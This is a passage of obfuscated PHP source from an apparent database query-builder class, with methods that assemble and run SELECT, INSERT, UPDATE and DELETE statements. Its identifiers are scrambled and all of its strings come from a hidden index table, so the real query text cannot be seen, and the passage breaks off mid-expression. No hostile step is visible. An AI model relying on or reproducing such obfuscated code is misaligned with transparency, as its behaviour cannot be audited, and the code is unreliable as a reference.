$å¢„•Ñ[999] => isset($·Ä¹×õÕ[$å¢„•Ñ[208]]) ? $·Ä¹×õÕ[$å¢„•Ñ[208]] : $å¢„•Ñ[12], $å¢„•Ñ[1000] => isset($·Ä¹×õÕ[$å¢„•Ñ[209]]) ? $·Ä¹×õÕ[$å¢„•Ñ[209]] : $å¢„•Ñ[12], $å¢„•Ñ[21] => isset($·Ä¹×õÕ[$å¢„•Ñ[87]]) ? substr($·Ä¹×õÕ[$å¢„•Ñ[87]], 1) : $å¢„•Ñ[12]); } else { preg_match($å¢„•Ñ[1102], trim($µÁ÷ñÃï), $…ƒ×Ó¯ß); $ÓŸ´ÓÛ¨ = array($å¢„•Ñ[1077] => $…ƒ×Ó¯ß[1], $å¢„•Ñ[1001] => $…ƒ×Ó¯ß[2], $å¢„•Ñ[1002] => $…ƒ×Ó¯ß[3], $å¢„•Ñ[999] => $…ƒ×Ó¯ß[4], $å¢„•Ñ[1000] => $…ƒ×Ó¯ß[5], $å¢„•Ñ[21] => $…ƒ×Ó¯ß[6]); } $ÓŸ´ÓÛ¨[$å¢„•Ñ[1032]] = $å¢„•Ñ[12]; return $ÓŸ´ÓÛ¨; } protected function debug() { $ä»ˆÓüù =& $_SERVER[±Ö‰ô½¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ä»ˆÓüù[1103]; if (think_config($ä»ˆÓüù[1104])) { think_status($ä»ˆÓüù[1105]); think_trace($this->queryStr . $ä»ˆÓüù[1106] . think_status($ä»ˆÓüù[24], $ä»ˆÓüù[1105], 6) . $ä»ˆÓüù[1107], $ä»ˆÓüù[12], $ä»ˆÓüù[1108]); } } protected function parseLock($î®¯¾Ÿ = false) { $íµ•ææ× =& $_SERVER[±Ö‰ô½¯]; if (!$î®¯¾Ÿ) { return $íµ•ææ×[12]; } if ($íµ•ææ×[1034] == $this->dbType) { return $íµ•ææ×[1109]; } return $íµ•ææ×[1110]; } protected function parseSet($÷‘ÅÀè“) { $»à¼ä©è =& $_SERVER[±Ö‰ô½¯]; foreach ($÷‘ÅÀè“ as $ƒ½ç˜Ã¡ => $Èê¸–Î°) { if (is_array($Èê¸–Î°) && $»à¼ä©è[374] == $Èê¸–Î°[0]) { $«˜áíıæ[] = $this->parseKey($ƒ½ç˜Ã¡) . $»à¼ä©è[465] . $Èê¸–Î°[1]; } elseif (is_scalar($Èê¸–Î°) || is_null($Èê¸–Î°)) { $«˜áíıæ[] = $this->parseKey($ƒ½ç˜Ã¡) . $»à¼ä©è[465] . $this->parseValue($Èê¸–Î°); } } return $»à¼ä©è[1111] . implode($»à¼ä©è[50], $«˜áíıæ); } protected function bindParam($ƒášÕê, $×ĞÎÜÒ¾) { $this->bind[$_SERVER[±Ö‰ô½¯][4] . $ƒášÕê] = $×ĞÎÜÒ¾; } protected function parseBind($Ì¥ãŠáÌ) { $Ì¥ãŠáÌ = array_merge($this->bind, $Ì¥ãŠáÌ); $this->bind = array(); return $Ì¥ãŠáÌ; } function parseKey(&$ÀÚå”æ, $êí¨Ôüô = true) { if ($êí¨Ôüô) { $ÀÚå”æ = $this->parseKeyCheck($ÀÚå”æ); } return $ÀÚå”æ; } function parseKeyCheck($³§®®ó) { $íÔ³³ğ =& $_SERVER[±Ö‰ô½¯]; $³§®®ó = trim($³§®®ó); if (!preg_match($íÔ³³ğ[1112], $³§®®ó)) { think_exception($íÔ³³ğ[1113] . $³§®®ó); } return $³§®®ó; } protected function parseValue($Éáõ¡¶±) { $¯‹­á°¢ =& $_SERVER[±Ö‰ô½¯]; if (is_string($Éáõ¡¶±)) { $Éáõ¡¶± = $¯‹­á°¢[1073] . $this->escapeString($Éáõ¡¶±) . $¯‹­á°¢[1073]; } elseif (isset($Éáõ¡¶±[0]) && is_string($Éáõ¡¶±[0]) && strtolower($Éáõ¡¶±[0]) == $¯‹­á°¢[374]) { $Éáõ¡¶± = $this->escapeString($Éáõ¡¶±[1]); } elseif (is_array($Éáõ¡¶±)) { $Éáõ¡¶± = array_map(array($this, $¯‹­á°¢[1074]), $Éáõ¡¶±); } elseif (is_bool($Éáõ¡¶±)) { $Éáõ¡¶± = $Éáõ¡¶± ? $¯‹­á°¢[91] : $¯‹­á°¢[230]; } elseif (is_null($Éáõ¡¶±)) { $Éáõ¡¶± = $¯‹­á°¢[104]; } return $Éáõ¡¶±; } protected function parseField($”‘×ñ«) { $¤ÏË¡³¡ =& $_SERVER[±Ö‰ô½¯]; if (is_string($”‘×ñ«) && strpos($”‘×ñ«, $¤ÏË¡³¡[50])) { $”‘×ñ« = explode($¤ÏË¡³¡[50], $”‘×ñ«); } if (is_array($”‘×ñ«)) { $ïçÎ£· = array(); foreach ($”‘×ñ« as $å¦Æ£óÓ => $¡Ì’˜æŒ) { if (!is_numeric($å¦Æ£óÓ)) { $ïçÎ£·[] = $this->parseKey($å¦Æ£óÓ, !1) . $¤ÏË¡³¡[1114] . $this->parseKey($¡Ì’˜æŒ); } else { $ïçÎ£·[] = $this->parseKey($¡Ì’˜æŒ); } } $Í§¹ş£Ø = implode($¤ÏË¡³¡[50], $ïçÎ£·); } elseif (is_string($”‘×ñ«) && !empty($”‘×ñ«)) { $Í§¹ş£Ø = $”‘×ñ«; } else { $Í§¹ş£Ø = $¤ÏË¡³¡[222]; } return $Í§¹ş£Ø; } protected function parseTable($—º×´‘æ) { $Ùåè¤¨¾ =& $_SERVER[±Ö‰ô½¯]; if (is_array($—º×´‘æ)) { $ñà ”Ô¥ = array(); foreach ($—º×´‘æ as $´¹åéË± => $²¦´±ïŠ) { if (!is_numeric($´¹åéË±)) { $ñà ”Ô¥[] = $this->parseKey($´¹åéË±) . $Ùåè¤¨¾[53] . $this->parseKey($²¦´±ïŠ); } else { $ñà ”Ô¥[] = $this->parseKey($´¹åéË±); } } $—º×´‘æ = $ñà ”Ô¥; } elseif (is_string($—º×´‘æ)) { if (strstr($—º×´‘æ, $Ùåè¤¨¾[53])) { return $—º×´‘æ; } $—º×´‘æ = explode($Ùåè¤¨¾[50], $—º×´‘æ); array_walk($—º×´‘æ, array($this, $Ùåè¤¨¾[1019])); } return $Ùåè¤¨¾[1013] . trim(implode($Ùåè¤¨¾[1115], $—º×´‘æ), $Ùåè¤¨¾[473]) . $Ùåè¤¨¾[1013]; } protected function parseWhere($ïÎ‡„Äæ) { $‚ı¸×·Û =& $_SERVER[±Ö‰ô½¯]; $ÏœÃ¼Œ = $‚ı¸×·Û[12]; if (is_string($ïÎ‡„Äæ)) { $ÏœÃ¼Œ = $ïÎ‡„Äæ; } else { $œ¿›ÆşÎ = isset($ïÎ‡„Äæ[$‚ı¸×·Û[1116]]) ? strtoupper($ïÎ‡„Äæ[$‚ı¸×·Û[1116]]) : $‚ı¸×·Û[12]; if (in_array($œ¿›ÆşÎ, array($‚ı¸×·Û[1117], $‚ı¸×·Û[1118], $‚ı¸×·Û[1119]))) { $œ¿›ÆşÎ = $‚ı¸×·Û[53] . $œ¿›ÆşÎ . $‚ı¸×·Û[53]; unset($ïÎ‡„Äæ[$‚ı¸×·Û[1116]]); } else { $œ¿›ÆşÎ = $‚ı¸×·Û[1120]; } foreach ($ïÎ‡„Äæ as $­Şı¡“Œ => $ƒÔîÔŸğ) { $ÏœÃ¼Œ .= $‚ı¸×·Û[357]; if (is_numeric($­Şı¡“Œ)) { $­Şı¡“Œ = $‚ı¸×·Û[1121]; } if (0 === strpos($­Şı¡“Œ, $‚ı¸×·Û[11])) { $ÏœÃ¼Œ .= $this->parseThinkWhere($­Şı¡“Œ, $ƒÔîÔŸğ); } else { if (!preg_match($‚ı¸×·Û[1122], trim($­Şı¡“Œ))) { think_exception(think_lang($‚ı¸×·Û[1123]) . $‚ı¸×·Û[4] . $­Şı¡“Œ); } $ŒÕê¶€ = is_array($ƒÔîÔŸğ) && isset($ƒÔîÔŸğ[$‚ı¸×·Û[1124]]); $­Şı¡“Œ = trim($­Şı¡“Œ); if (strpos($­Şı¡“Œ, $‚ı¸×·Û[214])) { $ÒïÄÉÁ¿ = explode($‚ı¸×·Û[214], $­Şı¡“Œ); $¯Ú‹ô¡… = array(); foreach ($ÒïÄÉÁ¿ as $‡ş¦—îÀ => $‘ÚÁÀ„—) { $®¹±Éª™ = $ŒÕê¶€ ? $ƒÔîÔŸğ[$‡ş¦—îÀ] : $ƒÔîÔŸğ; $¯Ú‹ô¡…[] = $‚ı¸×·Û[339] . $this->parseWhereItem($this->parseKey($‘ÚÁÀ„—), $®¹±Éª™) . $‚ı¸×·Û[1018]; } $ÏœÃ¼Œ .= implode($‚ı¸×·Û[1125], $¯Ú‹ô¡…); } elseif (strpos($­Şı¡“Œ, $‚ı¸×·Û[286])) { $ÒïÄÉÁ¿ = explode($‚ı¸×·Û[286], $­Şı¡“Œ); $¯Ú‹ô¡… = array(); foreach ($ÒïÄÉÁ¿ as $‡ş¦—îÀ => $‘ÚÁÀ„—) { $®¹±Éª™ = $ŒÕê¶€ ? $ƒÔîÔŸğ[$‡ş¦—îÀ] : $ƒÔîÔŸğ; $¯Ú‹ô¡…[] = $‚ı¸×·Û[339] . $this->parseWhereItem($this->parseKey($‘ÚÁÀ„—), $®¹±Éª™) . $‚ı¸×·Û[1018]; } $ÏœÃ¼Œ .= implode($‚ı¸×·Û[1120], $¯Ú‹ô¡…); } else { $ÏœÃ¼Œ .= $this->parseWhereItem($this->parseKey($­Şı¡“Œ), $ƒÔîÔŸğ); } } $ÏœÃ¼Œ .= $‚ı¸×·Û[358] . $œ¿›ÆşÎ; } $ÏœÃ¼Œ = substr($ÏœÃ¼Œ, 0, -strlen($œ¿›ÆşÎ)); } return empty($ÏœÃ¼Œ) ? $‚ı¸×·Û[12] : $‚ı¸×·Û[1126] . $ÏœÃ¼Œ; } protected function parseWhereItem($†íÜÜùô, $íİÈÊæ) { $ùÖ˜ª×Ë =& $_SERVER[±Ö‰ô½¯]; $ƒÛÕˆëó = $ùÖ˜ª×Ë[12]; if (is_array($íİÈÊæ)) { if (is_string($íİÈÊæ[0])) { $ÍÏÀÌä  = strtolower($íİÈÊæ[0]); if (in_array($íİÈÊæ[0], array($ùÖ˜ª×Ë[465], $ùÖ˜ª×Ë[1127], $ùÖ˜ª×Ë[1128], $ùÖ˜ª×Ë[1129], $ùÖ˜ª×Ë[1130], $ùÖ˜ª×Ë[1131]))) { $ƒÛÕˆëó .= $†íÜÜùô . $ùÖ˜ª×Ë[53] . $íİÈÊæ[0] . $ùÖ˜ª×Ë[53] . $this->parseValue($íİÈÊæ[1]); } elseif (preg_match($ùÖ˜ª×Ë[1132], $íİÈÊæ[0])) { $ƒÛÕˆëó .= $†íÜÜùô . $ùÖ˜ª×Ë[53] . $this->exp[$ÍÏÀÌä ] . $ùÖ˜ª×Ë[53] . $this->parseValue($íİÈÊæ[1]); } elseif (preg_match($ùÖ˜ª×Ë[1133], $íİÈÊæ[0])) { if (is_array($íİÈÊæ[1])) { $Ï–†«øõ = isset($íİÈÊæ[2]) ? strtoupper($íİÈÊæ[2]) : $ùÖ˜ª×Ë[1118]; if (in_array($Ï–†«øõ, array($ùÖ˜ª×Ë[1117], $ùÖ˜ª×Ë[1118], $ùÖ˜ª×Ë[1119]))) { $”å£¯š = array(); foreach ($íİÈÊæ[1] as $şˆÊĞÂ¼) { $”å£¯š[] = $†íÜÜùô . $ùÖ˜ª×Ë[53] . $this->exp[$ÍÏÀÌä ] . $ùÖ˜ª×Ë[53] . $this->parseValue($şˆÊĞÂ¼); } $ƒÛÕˆëó .= $ùÖ˜ª×Ë[339] . implode($ùÖ˜ª×Ë[53] . $Ï–†«øõ . $ùÖ˜ª×Ë[53], $”å£¯š) . $ùÖ˜ª×Ë[1018]; } } else { $ƒÛÕˆëó .= $†íÜÜùô . $ùÖ˜ª×Ë[53] . $this->exp[$ÍÏÀÌä ] . $ùÖ˜ª×Ë[53] . $this->parseValue($íİÈÊæ[1]); } } elseif ($ùÖ˜ª×Ë[374] == $ÍÏÀÌä ) { $ƒÛÕˆëó .= $ùÖ˜ª×Ë[1016] . $†íÜÜùô . $ùÖ˜ª×Ë[53] . $íİÈÊæ[1] . $ùÖ˜ª×Ë[1134]; } elseif (preg_match($ùÖ˜ª×Ë[1135], $íİÈÊæ[0])) { $ƒÛÕˆëó .= $íİÈÊæ[0]; } elseif (preg_match($ùÖ˜ª×Ë[1136], $íİÈÊæ[0])) { if (isset($íİÈÊæ[2]) && $ùÖ˜ª×Ë[374] == $íİÈÊæ[2]) { $ƒÛÕˆëó .= $†íÜÜùô . $ùÖ˜ª×Ë[53] . $this->exp[$ÍÏÀÌä ] . $ùÖ˜ª×Ë[53] . $íİÈÊæ[1]; } else { if (is_string($íİÈÊæ[1])) { $íİÈÊæ[1] = explode($ùÖ˜ª×Ë[50], $íİÈÊæ[1]); } $è€†¾§Ô = implode($ùÖ˜ª×Ë[50], $this->parseValue($íİÈÊæ[1])); $ƒÛÕˆëó .= $†íÜÜùô . $ùÖ˜ª×Ë[53] . $this->exp[$ÍÏÀÌä ] . $ùÖ˜ª×Ë[1016] . $è€†¾§Ô . $ùÖ˜ª×Ë[1018]; } } elseif (preg_match($ùÖ˜ª×Ë[1137], $íİÈÊæ[0])) { $Ì³Šñƒ® = is_string($íİÈÊæ[1]) ? explode($ùÖ˜ª×Ë[50], $íİÈÊæ[1]) : $íİÈÊæ[1]; $ƒÛÕˆëó .= $ùÖ˜ª×Ë[1016] . $†íÜÜùô . $ùÖ˜ª×Ë[53] . $this->exp[$ÍÏÀÌä ] . $ùÖ˜ª×Ë[53] . $this->parseValue($Ì³Šñƒ®[0]) . $ùÖ˜ª×Ë[1120] . $this->parseValue($Ì³Šñƒ®[1]) . $ùÖ˜ª×Ë[358]; } else { think_exception(think_lang($ùÖ˜ª×Ë[1123]) . $ùÖ˜ª×Ë[4] . $íİÈÊæ[0]); } } else { $ª• ş‚ = count($íİÈÊæ); $ƒ¥³êí› = $ùÖ˜ª×Ë[12]; if (is_string($íİÈÊæ[$ª• ş‚ - 1])) { $ƒ¥³êí› = isset($íİÈÊæ[$ª• ş‚ - 1]) ? strtoupper($íİÈÊæ[$ª• ş‚ - 1]) : $ùÖ˜ª×Ë[12]; if (in_array($ƒ¥³êí›, array($ùÖ˜ª×Ë[1117], $ùÖ˜ª×Ë[1118], $ùÖ˜ª×Ë[1119]))) { $ª• ş‚ = $ª• ş‚ - 1; } } else { $ƒ¥³êí› = $ùÖ˜ª×Ë[1117]; } for ($Ü›‡ù‰± = 0; $Ü›‡ù‰± < $ª• ş‚; $Ü›‡ù‰±++) { $Ì³Šñƒ® = is_array($íİÈÊæ[$Ü›‡ù‰±]) ? $íİÈÊæ[$Ü›‡ù‰±][1] : $íİÈÊæ[$Ü›‡ù‰±]; if ($ùÖ˜ª×Ë[374] == strtolower($íİÈÊæ[$Ü›‡ù‰±][0])) { $ƒÛÕˆëó .= $ùÖ˜ª×Ë[339] . $†íÜÜùô . $ùÖ˜ª×Ë[53] . $Ì³Šñƒ® . $ùÖ˜ª×Ë[1134] . $ƒ¥³êí› . $ùÖ˜ª×Ë[53]; } else { $õ¿½Ùå„ = is_array($íİÈÊæ[$Ü›‡ù‰±]) ? $this->exp[strtolower($íİÈÊæ[$Ü›‡ù‰±][0])] : $ùÖ˜ª×Ë[465]; if (!$õ¿½Ùå„ && is_array($íİÈÊæ[$Ü›‡ù‰±]) && in_array($íİÈÊæ[$Ü›‡ù‰±][0], array($ùÖ˜ª×Ë[465], $ùÖ˜ª×Ë[1127], $ùÖ˜ª×Ë[1128], $ùÖ˜ª×Ë[1129], $ùÖ˜ª×Ë[1130], $ùÖ˜ª×Ë[1131]))) { $õ¿½Ùå„ = $íİÈÊæ[$Ü›‡ù‰±][0]; } $ƒÛÕˆëó .= $ùÖ˜ª×Ë[339] . $†íÜÜùô . $ùÖ˜ª×Ë[53] . $õ¿½Ùå„ . $ùÖ˜ª×Ë[53] . $this->parseValue($Ì³Šñƒ®) . $ùÖ˜ª×Ë[1134] . $ƒ¥³êí› . $ùÖ˜ª×Ë[53]; } } $ƒÛÕˆëó = substr($ƒÛÕˆëó, 0, -4); } } else { $ƒÛÕˆëó .= $†íÜÜùô . $ùÖ˜ª×Ë[1138] . $this->parseValue($íİÈÊæ); } return $ƒÛÕˆëó; } protected function parseThinkWhere($‡ÂÅ¨ÚÈ, $ü›‡·¹œ) { $‘„ªà¦Õ =& $_SERVER[±Ö‰ô½¯]; $Ò»ßˆäÉ = $‘„ªà¦Õ[12]; switch ($‡ÂÅ¨ÚÈ) { case $‘„ªà¦Õ[429]: $Ò»ßˆäÉ = $ü›‡·¹œ; break; case $‘„ªà¦Õ[1121]: $Ò»ßˆäÉ = is_string($ü›‡·¹œ) ? $ü›‡·¹œ : substr($this->parseWhere($ü›‡·¹œ), 6); break; case $‘„ªà¦Õ[1139]: parse_str($ü›‡·¹œ, $„©´µÄ°); if (isset($„©´µÄ°[$‘„ªà¦Õ[1116]])) { $©‚àÒÅ = $‘„ªà¦Õ[53] . strtoupper($„©´µÄ°[$‘„ªà¦Õ[1116]]) . $‘„ªà¦Õ[53]; unset($„©´µÄ°[$‘„ªà¦Õ[1116]]); } else { $©‚àÒÅ = $‘„ªà¦Õ[1120]; } $¯…¯Ğî = array(); foreach ($„©´µÄ° as $Ñ©Á Ûİ => $Ç¦¬–¢) { $¯…¯Ğî[] = $this->parseKey($Ñ©Á Ûİ) . $‘„ªà¦Õ[1138] . $this->parseValue($Ç¦¬–¢); } $Ò»ßˆäÉ = implode($©‚àÒÅ, $¯…¯Ğî); break; } return $Ò»ßˆäÉ; } protected function parseLimit($„†¢ÇÅ“) { $¦¯äùÛÄ =& $_SERVER[±Ö‰ô½¯]; return !empty($„†¢ÇÅ“) ? $¦¯äùÛÄ[51] . $„†¢ÇÅ“ . $¦¯äùÛÄ[53] : $¦¯äùÛÄ[12]; } protected function parseJoin($“îÀìªê) { $ØŠÍÚ® =& $_SERVER[±Ö‰ô½¯]; $¾ªÌËû = $ØŠÍÚ®[12]; if (!empty($“îÀìªê)) { if (is_array($“îÀìªê)) { foreach ($“îÀìªê as $®àœ­­‘ => $¦–» ö) { if (!1 !== stripos($¦–» ö, $ØŠÍÚ®[1140])) { $¾ªÌËû .= $ØŠÍÚ®[53] . $¦–» ö; } else { $¾ªÌËû .= $ØŠÍÚ®[1141] . $¦–» ö; } } } else { $¾ªÌËû .= $ØŠÍÚ®[1141] . $“îÀìªê; } } $¾ªÌËû = preg_replace($ØŠÍÚ®[1142], think_config($ØŠÍÚ®[1046]) . $ØŠÍÚ®[1143], $¾ªÌËû); return $¾ªÌËû; } protected function parseOrder($¶ïæ¼ìû) { $Ó—‡†ÎÒ =& $_SERVER[±Ö‰ô½¯]; if (is_array($¶ïæ¼ìû)) { $èğ€®šƒ = array(); foreach ($¶ïæ¼ìû as $‚ªéöò‚ => $ØÌãæ) { if (is_numeric($‚ªéöò‚)) { $èğ€®šƒ[] = $this->parseKey($ØÌãæ); } else { $ØÌãæ = in_array(strtoupper(trim($ØÌãæ)), array($Ó—‡†ÎÒ[1144], $Ó—‡†ÎÒ[1145])) ? $Ó—‡†ÎÒ[53] . $ØÌãæ : $Ó—‡†ÎÒ[12]; if (preg_match($Ó—‡†ÎÒ[1146], $‚ªéöò‚)) { $èğ€®šƒ[] = $this->parseKey($‚ªéöò‚) . $ØÌãæ; } else { think_exception($Ó—‡†ÎÒ[1147] . $‚ªéöò‚); } } } $¶ïæ¼ìû = implode($Ó—‡†ÎÒ[50], $èğ€®šƒ); } return !empty($¶ïæ¼ìû) ? $Ó—‡†ÎÒ[1148] . $¶ïæ¼ìû : $Ó—‡†ÎÒ[12]; } protected function parseGroup($‘ ïüğú) { $»¨Ïİ =& $_SERVER[±Ö‰ô½¯]; return !empty($‘ ïüğú) ? $»¨Ïİ[1149] . $‘ ïüğú : $»¨Ïİ[12]; } protected function parseHaving($ÙıèËËĞ) { $¼…’ª’ =& $_SERVER[±Ö‰ô½¯]; return !empty($ÙıèËËĞ) ? $¼…’ª’[1150] . $ÙıèËËĞ : $¼…’ª’[12]; } protected function parseComment($‹à³ü®Â) { $ØÌ¸ş¥ =& $_SERVER[±Ö‰ô½¯]; return !empty($‹à³ü®Â) ? $ØÌ¸ş¥[1151] . $‹à³ü®Â . $ØÌ¸ş¥[1152] : $ØÌ¸ş¥[12]; } protected function parseDistinct($½²‡‰Èû) { $œùŠ²‰½ =& $_SERVER[±Ö‰ô½¯]; return !empty($½²‡‰Èû) ? $œùŠ²‰½[1153] : $œùŠ²‰½[12]; } protected function parseUnion($¤ÏëìÛ¯) { $³Ğ¾¢²‹ =& $_SERVER[±Ö‰ô½¯]; if (empty($¤ÏëìÛ¯)) { return $³Ğ¾¢²‹[12]; } if (isset($¤ÏëìÛ¯[$³Ğ¾¢²‹[425]])) { $¿ÈœÚ¨æ = $³Ğ¾¢²‹[1154]; unset($¤ÏëìÛ¯[$³Ğ¾¢²‹[425]]); } else { $¿ÈœÚ¨æ = $³Ğ¾¢²‹[1155]; } foreach ($¤ÏëìÛ¯ as $‰Ä†ŒÚ) { $¤˜íÍŒ‰[] = $¿ÈœÚ¨æ . (is_array($‰Ä†ŒÚ) ? $this->buildSelectSql($‰Ä†ŒÚ) : $‰Ä†ŒÚ); } return implode($³Ğ¾¢²‹[53], $¤˜íÍŒ‰); } public function insert($êÍ¼Š£¯, $“ØıÃ•¦ = array(), $Å½­ªäÌ = false) { $˜ÇË™¡ =& $_SERVER[±Ö‰ô½¯]; $İÙºñ©ˆ = $ÚíãšéÂ = array(); $this->model = $“ØıÃ•¦[$˜ÇË™¡[361]]; foreach ($êÍ¼Š£¯ as $Š“ÁÕ™ê => $ù¯ïÚŠ¸) { if (is_array($ù¯ïÚŠ¸) && $˜ÇË™¡[374] == $ù¯ïÚŠ¸[0]) { $ÚíãšéÂ[] = $this->parseKey($Š“ÁÕ™ê); $İÙºñ©ˆ[] = $ù¯ïÚŠ¸[1]; } elseif (is_scalar($ù¯ïÚŠ¸) || is_null($ù¯ïÚŠ¸)) { $ÚíãšéÂ[] = $this->parseKey($Š“ÁÕ™ê); $İÙºñ©ˆ[] = $this->parseValue($ù¯ïÚŠ¸); } } $í¹×ïÇº = ($Å½­ªäÌ ? $˜ÇË™¡[1020] : $˜ÇË™¡[1021]) . $˜ÇË™¡[1022] . $this->parseTable($“ØıÃ•¦[$˜ÇË™¡[359]]) . $˜ÇË™¡[1016] . implode($˜ÇË™¡[50], $ÚíãšéÂ) . $˜ÇË™¡[1017] . implode($˜ÇË™¡[50], $İÙºñ©ˆ) . $˜ÇË™¡[1018]; $í¹×ïÇº .= $this->parseLock(isset($“ØıÃ•¦[$˜ÇË™¡[952]]) ? $“ØıÃ•¦[$˜ÇË™¡[952]] : !1); $í¹×ïÇº .= $this->parseComment(!empty($“ØıÃ•¦[$˜ÇË™¡[431]]) ? $“ØıÃ•¦[$˜ÇË™¡[431]] : $˜ÇË™¡[12]); return $this->execute($í¹×ïÇº, $this->parseBind(!empty($“ØıÃ•¦[$˜ÇË™¡[363]]) ? $“ØıÃ•¦[$˜ÇË™¡[363]] : array())); } public function selectInsert($êş£™, $ñÖ’è±ô, $«ËáÏÇ× = array()) { $‚˜½ş›Ì =& $_SERVER[±Ö‰ô½¯]; $this->model = $«ËáÏÇ×[$‚˜½ş›Ì[361]]; if (is_string($êş£™)) { $êş£™ = explode($‚˜½ş›Ì[50], $êş£™); } array_walk($êş£™, array($this, $‚˜½ş›Ì[1019])); $Ú¶ëÕŠ‚ = $‚˜½ş›Ì[1156] . $this->parseTable($ñÖ’è±ô) . $‚˜½ş›Ì[1016] . implode($‚˜½ş›Ì[50], $êş£™) . $‚˜½ş›Ì[1134]; $Ú¶ëÕŠ‚ .= $this->buildSelectSql($«ËáÏÇ×); return $this->execute($Ú¶ëÕŠ‚, $this->parseBind(!empty($«ËáÏÇ×[$‚˜½ş›Ì[363]]) ? $«ËáÏÇ×[$‚˜½ş›Ì[363]] : array())); } public function update($±èÔñ¦Ä, $™Îëˆ…) { $¿îŠßıô =& $_SERVER[±Ö‰ô½¯]; $this->model = $™Îëˆ…[$¿îŠßıô[361]]; $­ûê¬î = $¿îŠßıô[1157] . $this->parseTable($™Îëˆ…[$¿îŠßıô[359]]) . $this->parseSet($±èÔñ¦Ä) . $this->parseWhere(!empty($™Îëˆ…[$¿îŠßıô[355]]) ? $™Îëˆ…[$¿îŠßıô[355]] : $¿îŠßıô[12]) . $this->parseOrder(!empty($™Îëˆ…[$¿îŠßıô[443]]) ? $™Îëˆ…[$¿îŠßıô[443]] : $¿îŠßıô[12]) . $this->parseLimit(!empty($™Îëˆ…[$¿îŠßıô[370]]) ? $™Îëˆ…[$¿îŠßıô[370]] : $¿îŠßıô[12]) . $this->parseLock(isset($™Îëˆ…[$¿îŠßıô[952]]) ? $™Îëˆ…[$¿îŠßıô[952]] : !1) . $this->parseComment(!empty($™Îëˆ…[$¿îŠßıô[431]]) ? $™Îëˆ…[$¿îŠßıô[431]] : $¿îŠßıô[12]); return $this->execute($­ûê¬î, $this->parseBind(!empty($™Îëˆ…[$¿îŠßıô[363]]) ? $™Îëˆ…[$¿îŠßıô[363]] : array())); } public function delete($¸°çÒşº = array()) { $»³é¥½ˆ =& $_SERVER[±Ö‰ô½¯]; $this->model = $¸°çÒşº[$»³é¥½ˆ[361]]; $òÈ’…¼ã = $»³é¥½ˆ[1158] . $this->parseTable($¸°çÒşº[$»³é¥½ˆ[359]]) . $this->parseWhere(!empty($¸°çÒşº[$»³é¥½ˆ[355]]) ? $¸°çÒşº[$»³é¥½ˆ[355]] : $»³é¥½ˆ[12]) . $this->parseOrder(!empty($¸°çÒşº[$»³é¥½ˆ[443]]) ? $¸°çÒşº[$»³é¥½ˆ[443]] : $»³é¥½ˆ[12]) . $this->parseLimit(!empty($¸°çÒşº[$»³é¥½ˆ[370]]) ? $¸°çÒşº[$»³é¥½ˆ[370]] : $»³é¥½ˆ[12]) . $this->parseLock(isset($¸°çÒşº[$»³é¥½ˆ[952]]) ? $¸°çÒşº[$»³é¥½ˆ[952]] : !1) . $this->parseComment(!empty($¸°çÒşº[$»³é¥½ˆ[431]]) ? $¸°çÒşº[$»³é¥½ˆ[431]] : $»³é¥½ˆ[12]); return $this->execute($òÈ’…¼ã, $this->parseBind(!empty($¸°çÒşº[$»³é¥½ˆ[363]]) ? $¸°çÒşº[$»³é¥½ˆ[363]] : array())); } public function select($–Û•Ü’ = array()) { $¬Øí€Û =& $_SERVER[±Ö‰ô½¯]; $this->model = $–Û•Ü’[$¬Øí€Û[361]]; $ìèÁï¹ = $this->buildSelectSql($–Û•Ü’); $¬„»µòÅ = isset($–Û•Ü’[$¬Øí€Û[426]]) ? $–Û•Ü’[$¬Øí€Û[426]] : !1; if ($¬„»µòÅ) { $°º¦Ò‰® = is_string($¬„»µòÅ[$¬Øí€Û[95]]) ? $¬„»µòÅ[$¬Øí€Û[95]] : $¬Øí€Û[1159] . md5($ìèÁï¹); $äì‘¢·Ò = think_cache($°º¦Ò‰®, $¬Øí€Û[12], $¬„»µòÅ); if (!1 !== $äì‘¢·Ò) { return $äì‘¢·Ò; } } $‡‘ŞÁ¾› = $this->query($ìèÁï¹, $this->parseBind(!empty($–Û•Ü’[$¬Øí€Û[363]]) ? $–Û•Ü’[$¬Øí€Û[363]] : array())); if ($¬„»µòÅ && !1 !== $‡‘ŞÁ¾›) { think_cache($°º¦Ò‰®, $‡‘ŞÁ¾›, $¬„»µòÅ); } return $‡‘ŞÁ¾›; } public function buildSelectSql($°¡æÓá£ = array()) { $‹±‡ø± =& $_SERVER[±Ö‰ô½¯]; if (isset($°¡æÓá£[$‹±‡ø±[430]])) { if (strpos($°¡æÓá£[$‹±‡ø±[430]], $‹±‡ø±[50])) { list($…ÚìÛŠİ, $İÜ«ï ) = explode($‹±‡ø±[50], $°¡æÓá£[$‹±‡ø±[430]]); } else { $…ÚìÛŠİ = $°¡æÓá£[$‹±‡ø±[430]]; } $…ÚìÛŠİ = $…ÚìÛŠİ ? $…ÚìÛŠİ : 1; $İÜ«ï  = isset($İÜ«ï ) ? $İÜ«ï  : (is_numeric($°¡æÓá£[$‹±‡ø±[370]]) ? $°¡æÓá£[$‹±‡ø±[370]] : 20); $¤Œ«÷¢© = $İÜ«ï  * ((int) $…ÚìÛŠİ - 1); $°¡æÓá£[$‹±‡ø±[370]] = $¤Œ«÷¢© . $‹±‡ø±[50] . $İÜ«ï ; } if (think_config($‹±‡ø±[1160])) { $ƒø–Â‚£ = $‹±‡ø±[1161] . md5(serialize($°¡æÓá£)); $¾Ğ•­¾‹ = think_cache($ƒø–Â‚£); if ($¾Ğ•­¾‹) { return $¾Ğ•­¾‹; } } $¬’áÍÔ = $this->parseSql($this->selectSql, $°¡æÓá£); $¬’áÍÔ .= $this->parseLock(isset($°¡æÓá£[$‹±‡ø±[952]]) ? $°¡æÓá£[$‹±‡ø±[952]] : !1); if (isset($ƒø–Â‚£)) { think_cache($ƒø–Â‚£, $¬’áÍÔ); } return $¬’áÍÔ; } public function parseSql($³Ò¢¦, $÷Õ¢¤øÛ = array()) { $õ°ô¿ÁŸ =& $_SERVER[±Ö‰ô½¯]; $³Ò¢¦ = str_replace(array($õ°ô¿ÁŸ[1162], $õ°ô¿ÁŸ[1163], $õ°ô¿ÁŸ[1164], $õ°ô¿ÁŸ[1165], $õ°ô¿ÁŸ[1166], $õ°ô¿ÁŸ[1167], $õ°ô¿ÁŸ[1168], $õ°ô¿ÁŸ[1169], $õ°ô¿ÁŸ[1170], $õ°ô¿ÁŸ[1171], $õ°ô¿ÁŸ[1172]), array($this->parseTable("{$÷Õ¢¤øÛ[$õ°ô¿ÁŸ[359]]}"), 